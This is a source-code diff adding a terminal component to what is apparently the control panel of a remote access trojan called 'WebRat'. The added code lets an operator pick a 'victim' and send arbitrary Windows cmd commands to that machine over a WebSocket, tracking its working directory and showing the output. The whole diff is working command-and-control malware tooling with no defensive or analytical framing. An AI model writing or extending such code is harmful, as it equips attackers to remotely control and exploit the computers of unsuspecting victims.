@@ -1,6 +1,133 @@
 "use client";
 
+import { useEffect } from "react";
+
+import { usePanelDetailView } from "../panel-detail-view-provider";
+import { usePanelWS } from "../../../ws/ws-provider";
+import { showToast } from "../../../toast";
+
 export function TerminalSection() {
+  const detail = usePanelDetailView();
+  const ws = usePanelWS();
+
+  useEffect(() => {
+    const consoleEl = document.getElementById("terminalConsole");
+    const inputEl = document.getElementById("terminalCommandInput") as HTMLInputElement | null;
+    const sendBtn = document.getElementById("terminalSendBtn") as HTMLButtonElement | null;
+    if (!consoleEl || !inputEl || !sendBtn) return;
+
+    let terminalUser = "user";
+    let terminalCwd = "";
+
+    const getPromptPrefix = () => {
+      let userName = terminalUser || "user";
+      terminalUser = userName;
+      const defaultCwd = `C:\\Users\\${userName}`;
+      if (!terminalCwd) terminalCwd = defaultCwd;
+      return `${terminalCwd}>`;
+    };
+
+    const appendLine = (prefix: string, text: string) => {
+      const line = document.createElement("div");
+      const prefSpan = document.createElement("span");
+      prefSpan.className = "terminal-line-prefix";
+      prefSpan.textContent = prefix + " ";
+      const textSpan = document.createElement("span");
+      textSpan.className = "terminal-line-text";
+      textSpan.textContent = text;
+      line.appendChild(prefSpan);
+      line.appendChild(textSpan);
+      consoleEl.appendChild(line);
+      consoleEl.scrollTop = consoleEl.scrollHeight;
+    };
+
+    (window as any).WebRatAppendTerminalOutput = (text: string) => {
+      const lines = String(text || "").split(/\r?\n/);
+      lines.forEach((ln) => {
+        if (!ln) return;
+        const raw = String(ln);
+        const trimmed = raw.trim();
+        if (trimmed.startsWith("__webrat_cwd__")) {
+          const next = trimmed.slice("__webrat_cwd__".length).trim();
+          if (next) terminalCwd = next;
+          return;
+        }
+        const line = document.createElement("div");
+        line.className = "terminal-line-output";
+        line.textContent = raw;
+        consoleEl.appendChild(line);
+      });
+      appendLine(getPromptPrefix(), "");
+    };
+
+    (window as any).WebRatEnsureTerminalPrompt = () => {
+      if (!consoleEl.hasChildNodes()) {
+        appendLine(getPromptPrefix(), "");
+      }
+    };
+
+    const sendCommand = () => {
+      const raw = String(inputEl.value || "").trim();
+      if (!raw) return;
+
+      if (raw.toLowerCase() === "cls") {
+        consoleEl.innerHTML = "";
+        appendLine(getPromptPrefix(), "");
+        inputEl.value = "";
+        return;
+      }
+
+      if (ws.state !== "open") {
+        showToast("error", "WebSocket is not connected");
+        return;
+      }
+
+      const victimId = detail.selectedVictimId;
+      if (!victimId) {
+        showToast("error", "Select victim first");
+        return;
+      }
+
+      const cwd = terminalCwd || getPromptPrefix().replace(/>\s*$/, "");
+      const safeCwd = String(cwd).replace(/"/g, "");
+      const wrappedCmd = `chcp 65001>nul & cd /d "${safeCwd}" & ${raw} & echo __webrat_cwd__%CD%`;
+
+      const ok = ws.sendJson({
+        type: "command",
+        victim_id: String(victimId),
+        command: "cmd:" + wrappedCmd,
+      });
+      if (!ok) {
+        showToast("error", "Failed to send command");
+        return;
+      }
+
+      appendLine(getPromptPrefix(), raw);
+      inputEl.value = "";
+    };
+
+    const onBtn = () => sendCommand();
+    const onKey = (e: KeyboardEvent) => {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        sendCommand();
+      }
+    };
+
+    sendBtn.addEventListener("click", onBtn);
+    inputEl.addEventListener("keydown", onKey);
+
+    try {
+      (window as any).WebRatEnsureTerminalPrompt();
+    } catch {
+    }
+
+    return () => {
+      sendBtn.removeEventListener("click", onBtn);
+      inputEl.removeEventListener("keydown", onKey);
+    };
+  }, [detail.selectedVictimId, ws]);
+
   return (
     <div className="detail-section h-full">
       <div className="relative flex h-full min-h-0 w-full flex-col overflow-hidden rounded-[18px] border border-white/15 bg-black/90 shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
